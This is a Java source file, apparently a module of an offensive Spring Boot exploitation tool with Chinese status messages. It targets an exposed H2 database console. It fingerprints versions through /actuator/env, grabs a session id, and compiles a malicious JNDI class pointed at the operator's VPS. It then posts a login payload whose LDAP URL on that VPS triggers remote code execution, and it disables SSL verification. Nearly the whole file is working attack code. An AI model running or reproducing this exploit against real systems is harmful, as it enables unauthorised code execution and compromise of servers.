package src.main.module;

import src.main.common.HTTPConfig;
import src.main.loadlib.ClassCom.ClsComp;
import src.main.common.VersionComparator;
import src.main.impl.ResultCallback;

import java.io.*;
import java.net.HttpURLConnection;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.ssl.sslVer.disableSSLVerification;

public class H2DataConsoleRCE {
    private String address;
    public  String text;
    private String vpsIP;
    private String vpsPort;
    private String jess;
    private boolean isPoc;
    public  String exp2 = "language=en&setting=Generic+H2+%%28Embedded%%29&name=Generic+H2+%%28Embedded%%29&driver=javax.naming.InitialContext&url=ldap://%s:1389/H2DataConsole&user=&password=";
    public H2DataConsoleRCE(String address,String vpsIP,String vpsPort, boolean isPoc){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPort = vpsPort;
        this.isPoc = isPoc;
    }

    public void exp(ResultCallback callback){
        String api = "/actuator/env";
        String site = address + api;
        String llib = "h2database";
        String llib1 = "spring.h2.console.enabled";
        String llib2 = "jdk";
        String h2site = address + "/h2-console/login.do?jsessionid=";
        String data = "";
        disableSSLVerification();
        try{
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib)) && (response.toString().contains(llib1))) {
                String regex = llib + "/h2/" + "(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = "\"" + llib1 + "\":\\{\"value\":\"(.*?)\"";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                String regex2 = llib2 + "(\\d+\\.\\d+\\.\\d+_\\d+)";
                Pattern pattern2 = Pattern.compile(regex2);
                Matcher matcher2 = pattern2.matcher(response.toString());
                if (matcher.find() && matcher1.find() && matcher2.find() && matcher1.group(1).equals("true")) {
                    text = String.format("h2database 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    text = String.format("spring.h2.console.enabled 值为 %s", matcher1.group(1));
                    callback.onResult(text);
                    text = String.format("jdk版本为: %s", matcher2.group(1));
                    callback.onResult(text);
                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/h2-console");
                    conn1.setRequestMethod("GET");
                    int responseCode1 = conn1.getResponseCode();
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    in1.close();
                    if ((responseCode1 == HttpURLConnection.HTTP_OK) && response1.toString().contains("jsessionid")){
                        String regex3 = "jsessionid=([a-zA-Z0-9]+)";
                        Pattern pattern3 = Pattern.compile(regex3);
                        Matcher matcher3 = pattern3.matcher(response1.toString());
                        if (matcher3.find()){
                            text = "jsessionid为: " + matcher3.group(1);
                            callback.onResult(text);
                            jess = matcher3.group(1);
                            ClsComp cc = new ClsComp(vpsIP,vpsPort);
                            boolean isModify = cc.modifyJavaClassFile("/JNDIObject/H2DataConsoleTemplate.java","H2DataConsole.java",callback);
                            if (isModify){
                                cc.CompileJava("H2DataConsole","H2DataConsole",callback);
                            }
                            HttpURLConnection conn2 = HTTPConfig.createConnection(h2site + jess);
                            data = String.format(exp2,vpsIP);
                            conn2.setRequestMethod("POST");
                            conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                            conn2.setRequestProperty("Referer",h2site + jess);
                            conn2.setRequestProperty("Host",address.replaceFirst("^https?://",""));
                            conn2.setReadTimeout(2000);    // 设置读取超时
                            conn2.setDoOutput(true);
                            try (OutputStream os = conn2.getOutputStream()) {
                                byte[] input = data.getBytes(StandardCharsets.UTF_8);
                                os.write(input, 0, input.length);
                            }
                            try {
                                System.out.println("这个漏洞发送payload服务器会超时，忽略异常，状态码: " + conn2.getResponseCode());
                            } catch (java.net.SocketTimeoutException e) {
                                text = "命令执行成功，请在vps上查看信息";
                                callback.onResult(text);
                                text = "当前监听vpsIP： " + vpsIP + " " + "vpsPort: " + vpsPort;
                                callback.onResult(text);
                            }
                        }else{
                            text = "未找到jsessionid";
                            callback.onResult(text);
                        }
                    }else{
                        text = "发起请求失败，请重试";
                        callback.onResult(text);
                    }
                }else{
                    text = "未找到依赖或spring.h2.console.enabled值为false";
                    callback.onResult(text);
                }
            }else{
                text = "发送请求失败，请重试";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "发起请求异常，请重试";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void poc(ResultCallback callback){
        String api = "/actuator/env";
        String site = address + api;
        String llib = "h2database";
        String llib1 = "spring.h2.console.enabled";
        String llib2 = "jdk";
        disableSSLVerification();
        try {
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib)) && (response.toString().contains(llib1))) {
                String regex = llib + "/h2/" + "(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = "\"" + llib1 + "\":\\{\"value\":\"(.*?)\"";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                String regex2 = llib2 + "(\\d+\\.\\d+\\.\\d+_\\d+)";
                Pattern pattern2 = Pattern.compile(regex2);
                Matcher matcher2 = pattern2.matcher(response.toString());
                if (matcher.find() && matcher1.find() && matcher2.find()) {
                    text = String.format("h2database 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    text = String.format("spring.h2.console.enabled 值为 %s", matcher1.group(1));
                    callback.onResult(text);
                    text = String.format("jdk版本为: %s", matcher2.group(1));
                    callback.onResult(text);
                    if (matcher1.group(1).equals("true") &&
                            VersionComparator.isVersionAtLeast(matcher2.group(1),"11.0.1") ||
                            VersionComparator.isVersionAtLeast(matcher2.group(1),"8u182") ||
                            VersionComparator.isVersionAtLeast(matcher2.group(1),"7u191") ||
                            VersionComparator.isVersionAtLeast(matcher2.group(1),"6u201")
                    ){
                        HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                        conn1.setDoOutput(true);
                        conn1.setRequestMethod("GET");
                        int responseCode1 = conn1.getResponseCode();
                        BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                        String inputLine1;
                        StringBuilder response1 = new StringBuilder();
                        while ((inputLine1 = in1.readLine()) != null) {
                            response1.append(inputLine1);
                        }
                        in1.close();
                        if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains("/restart")) && !matcher.group(1).isEmpty()) {
                            text = "可能存在漏洞";
                            callback.onResult(text);
                        }else {
                            text = "不存在可利用漏洞";
                            callback.onResult(text);
                        }
                    }else {
                        text = "不存在可利用漏洞";
                        callback.onResult(text);
                    }
                }
            }
        }catch (Exception e){
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }

    public void Exp(ResultCallback callback){
        String api ="/actuator/env";
        String site = address + api;
        disableSSLVerification();
        try{
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 存在路径是springboot2，否则是springboot1
                text = "当前版本为springboot2";
                callback.onResult(text);
                if (isPoc && vpsIP.isEmpty() && vpsPort.isEmpty()){
                    poc(callback);
                }else{
                    exp(callback);
                }
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
                callback.onResult(text);
                if (isPoc && vpsIP.isEmpty() && vpsPort.isEmpty()){
                    poc(callback);
                }else{
                    exp(callback);
                }
            }else{
                text = "未识别springboot版本";
                callback.onResult(text);
            }
        }catch (IOException e){
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
}
